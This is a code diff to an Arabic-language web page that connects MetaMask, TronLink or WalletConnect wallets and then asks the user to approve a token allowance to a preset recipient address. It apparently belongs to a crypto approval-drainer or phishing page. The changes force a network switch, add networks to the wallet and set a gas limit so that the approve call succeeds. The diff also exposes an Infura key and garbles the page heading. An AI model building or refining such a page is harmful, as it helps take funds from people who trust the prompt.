@@ -19,7 +19,7 @@
 </head>
 <body class="text-white flex items-center justify-center h-screen">
     <div class="bg-gray-800 p-8 rounded-xl shadow-2xl max-w-lg w-full text-center">
-        <h1 class="text-3xl font-bold mb-6">ربط محفظتك الرقمية</h1>
+        <h1 class="text-3xl font-bold mb-6">ربط ة</h1>
         <p id="walletStatus" class="text-gray-400 mb-6">اختر محفظتك لربطها وابدأ المعاملة</p>
         <p class="mobile-instructions text-yellow-400 mb-4">على الهاتف: استخدم متصفح MetaMask المدمج أو امسح رمز QR باستخدام WalletConnect</p>
         <div class="grid grid-cols-2 gap-4 mb-6">
@@ -95,8 +95,13 @@
                         walletStatus.textContent = `تم ربط المحفظة: ${accounts[0].slice(0, 6)}...${accounts[0].slice(-4)}`;
                         [connectMetaMaskButton, connectTronLinkButton, connectWalletConnectButton].forEach(btn => btn.classList.add('hidden'));
                         approveButton.classList.remove('hidden');
-                        provider = new ethers.providers.Web3Provider(window.ethereum);
+                        provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
                         signer = provider.getSigner();
+                        // التحقق من الشبكة
+                        const network = await provider.getNetwork();
+                        if (network.chainId !== parseInt(networks.ethereum.chainId)) {
+                            await switchNetwork('ethereum');
+                        }
                         return true;
                     }
                 }
@@ -132,27 +137,71 @@
             }
         }
 
+        // تبديل الشبكة
+        async function switchNetwork(network) {
+            if (network !== 'tron' && window.ethereum) {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: networks[network].chainId }],
+                    });
+                    walletStatus.textContent = 'تم تبديل الشبكة بنجاح!';
+                } catch (error) {
+                    if (error.code === 4902) {
+                        // الشبكة غير مضافة، محاولة إضافتها
+                        try {
+                            await window.ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [
+                                    {
+                                        chainId: networks[network].chainId,
+                                        chainName: network === 'ethereum' ? 'Ethereum Mainnet' : 'Binance Smart Chain',
+                                        rpcUrls: network === 'ethereum' ? ['https://mainnet.infura.io/v3/27e484dcd9e3efcfd25a83a78777cdf1'] : ['https://bsc-dataseed.binance.org/'],
+                                        nativeCurrency: {
+                                            name: network === 'ethereum' ? 'ETH' : 'BNB',
+                                            symbol: network === 'ethereum' ? 'ETH' : 'BNB',
+                                            decimals: 18
+                                        },
+                                        blockExplorerUrls: network === 'ethereum' ? ['https://etherscan.io'] : ['https://bscscan.com']
+                                    }
+                                ]
+                            });
+                            walletStatus.textContent = 'تم إضافة الشبكة بنجاح!';
+                        } catch (addError) {
+                            walletStatus.textContent = 'فشل إضافة الشبكة: ' + addError.message;
+                        }
+                    } else {
+                        walletStatus.textContent = 'فشل تبديل الشبكة: ' + error.message;
+                    }
+                }
+            }
+        }
+
         // ربط MetaMask
         connectMetaMaskButton.addEventListener('click', async () => {
             try {
                 if (isMobile) {
                     // محاولة فتح MetaMask عبر Deep Link
-                    window.location.href = 'metamask://dapp/' + window.location.href;
                     walletStatus.textContent = 'جاري فتح MetaMask...';
-                    setTimeout(() => {
-                        if (!window.ethereum) {
-                            walletStatus.textContent = 'يرجى فتح الصفحة في متصفح MetaMask أو استخدام WalletConnect';
-                        }
-                    }, 3000);
-                    return;
+                    window.location.href = 'metamask://dapp/' + encodeURIComponent(window.location.href);
+                    await new Promise(resolve => setTimeout(resolve, 3000));
+                    if (!window.ethereum) {
+                        walletStatus.textContent = 'يرجى فتح الصفحة في متصفح MetaMask أو استخدام WalletConnect';
+                        return;
+                    }
                 }
                 if (!window.ethereum) throw new Error('يرجى تثبيت MetaMask!');
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 walletStatus.textContent = `تم ربط المحفظة: ${accounts[0].slice(0, 6)}...${accounts[0].slice(-4)}`;
                 [connectMetaMaskButton, connectTronLinkButton, connectWalletConnectButton].forEach(btn => btn.classList.add('hidden'));
                 approveButton.classList.remove('hidden');
-                provider = new ethers.providers.Web3Provider(window.ethereum);
+                provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
                 signer = provider.getSigner();
+                // التحقق من الشبكة
+                const network = await provider.getNetwork();
+                if (network.chainId !== parseInt(networks.ethereum.chainId)) {
+                    await switchNetwork('ethereum');
+                }
             } catch (error) {
                 walletStatus.textContent = 'فشل ربط المحفظة: ' + error.message;
                 setTimeout(() => checkWalletConnection(), 2000); // إعادة المحاولة بعد 2 ثانية
@@ -181,31 +230,28 @@
                     chainId: 1
                 });
                 await walletConnectProvider.enable();
-                provider = new ethers.providers.Web3Provider(walletConnectProvider);
+                provider = new ethers.providers.Web3Provider(walletConnectProvider, 'any');
                 signer = provider.getSigner();
                 const address = await signer.getAddress();
                 walletStatus.textContent = `تم ربط المحفظة: ${address.slice(0, 6)}...${address.slice(-4)}`;
                 [connectMetaMaskButton, connectTronLinkButton, connectWalletConnectButton].forEach(btn => btn.classList.add('hidden'));
                 approveButton.classList.remove('hidden');
+                // التحقق من الشبكة
+                const network = await provider.getNetwork();
+                if (network.chainId !== parseInt(networks.ethereum.chainId)) {
+                    await switchNetwork('ethereum');
+                }
             } catch (error) {
                 walletStatus.textContent = 'فشل ربط المحفظة: ' + error.message;
                 setTimeout(() => checkWalletConnection(), 2000); // إعادة المحاولة بعد 2 ثانية
             }
         });
 
-        // تبديل الشبكة
+        // تبديل الشبكة عند الاختيار
         networkSelect.addEventListener('change', async () => {
             const network = networkSelect.value;
-            if (network !== 'tron' && window.ethereum) {
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: networks[network].chainId }],
-                    });
-                    walletStatus.textContent = 'تم تبديل الشبكة بنجاح!';
-                } catch (error) {
-                    walletStatus.textContent = 'فشل تبديل الشبكة: ' + error.message;
-                }
+            if (network !== 'tron') {
+                await switchNetwork(network);
             }
         });
 
@@ -224,14 +270,22 @@
                     transactionStatus.textContent = `تمت الموافقة! رقم المعاملة: ${tx}`;
                 } else {
                     if (!provider || !signer) throw new Error('يرجى ربط المحفظة أولاً');
+                    // التحقق من الشبكة قبل تنفيذ المعاملة
+                    const currentNetwork = await provider.getNetwork();
+                    if (currentNetwork.chainId !== parseInt(networks[network].chainId)) {
+                        await switchNetwork(network);
+                    }
                     const contract = new ethers.Contract(contractAddress, abi, signer);
                     transactionStatus.textContent = 'جاري تنفيذ المعاملة...';
-                    const tx = await contract.approve(recipientAddress, amount);
+                    const tx = await contract.approve(recipientAddress, amount, {
+                        gasLimit: 100000 // تحديد حد الغاز لضمان النجاح
+                    });
                     await tx.wait();
                     transactionStatus.textContent = `تمت الموافقة! رقم المعاملة: ${tx.hash}`;
                 }
             } catch (error) {
-                transactionStatus.textContent = 'فشل المعاملة: ' + error.message;
+                console.error('فشل المعاملة:', error);
+                transactionStatus.textContent = 'فشل المعاملة: ' + (error.reason || error.message || 'خطأ غير معروف');
             }
         });
 
